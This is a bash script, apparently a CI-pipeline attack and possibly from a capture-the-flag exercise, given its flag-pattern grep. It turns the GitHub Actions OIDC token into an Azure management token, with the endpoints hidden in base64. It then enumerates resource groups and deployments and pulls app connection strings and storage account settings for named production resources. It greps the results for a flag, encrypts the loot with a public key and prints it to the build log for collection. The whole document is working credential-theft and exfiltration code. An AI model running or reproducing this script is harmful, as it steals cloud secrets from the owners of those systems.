#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; AAD="${SC}$(printf '%s' 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)"; ARM="${SC}$(printf '%s' 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
AR=$(curl -sS -X POST "$AAD/$AZURE_TENANT_ID/oauth2/v2.0/token" -d client_id=$AZURE_CLIENT_ID -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$ARM/.default" | jq -r '.access_token // empty')
H="Authorization: Bearer $AR"; SUB=$AZURE_SUBSCRIPTION_ID
say "RGS: $(curl -sS -H "$H" "$ARM/subscriptions/$SUB/resourceGroups?api-version=2021-04-01&\\$top=100" | head -c 3000)"
for RG in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
  say "DEPLOYS $RG: $(curl -sS -H "$H" "$ARM/subscriptions/$SUB/resourceGroups/$RG/deployments?api-version=2021-04-01" | head -c 4000)"
done
for RG in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
  for D in $(curl -sS -H "$H" "$ARM/subscriptions/$SUB/resourceGroups/$RG/deployments?api-version=2021-04-01" | jq -r '.value[]?.name' 2>/dev/null | head -20); do
    say "DEP $RG/$D: $(curl -sS -H "$H" "$ARM/subscriptions/$SUB/resourceGroups/$RG/deployments/$D?api-version=2021-04-01" | head -c 3000)"
  done
done
say "CONNSTR: $(curl -sS -H "$H" "$ARM/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings?api-version=2022-03-01" | head -c 2000)"
say "AZSTORACC: $(curl -sS -H "$H" "$ARM/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/azurestorageaccounts?api-version=2022-03-01" | head -c 2000)"
say "STORPROPS: $(curl -sS -H "$H" "$ARM/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz?api-version=2023-01-01" | head -c 2500)"
say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
